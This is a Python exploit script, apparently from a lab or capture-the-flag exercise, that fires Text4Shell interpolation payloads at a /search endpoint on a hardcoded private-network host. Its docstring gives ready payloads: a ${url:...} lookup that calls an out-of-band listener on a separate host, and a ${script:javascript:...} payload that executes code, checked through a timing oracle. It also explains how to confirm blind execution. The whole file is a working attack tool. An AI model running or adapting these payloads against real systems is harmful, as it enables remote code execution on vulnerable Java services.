#!/usr/bin/env python3
"""Send a Text4Shell lookup payload to /search?query= and print the response.

    ./t4s_probe.py '${url:UTF-8:http://192.168.45.158:8899/oob}'
    ./t4s_probe.py '${script:javascript:java.lang.Thread.sleep(4000)}' 30

The endpoint echoes the raw parameter and always returns an empty "result",
so a successful payload produces no visible change in the response. Use an
out-of-band listener or the timing oracle to confirm execution.

Requires: requests
"""
import sys

import requests

TARGET = "http://192.168.237.150:8080/search"


def main() -> int:
    if len(sys.argv) < 2:
        print(__doc__)
        return 1
    payload = sys.argv[1]
    timeout = float(sys.argv[2]) if len(sys.argv) > 2 else 30.0
    try:
        r = requests.get(TARGET, params={"query": payload}, timeout=timeout)
    except requests.exceptions.Timeout:
        print(f"[!] timeout after {timeout}s (a blocking payload will do this)")
        return 2
    print(f"[*] status={r.status_code} len={len(r.content)}")
    print(f"[*] body={r.text[:1000]}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
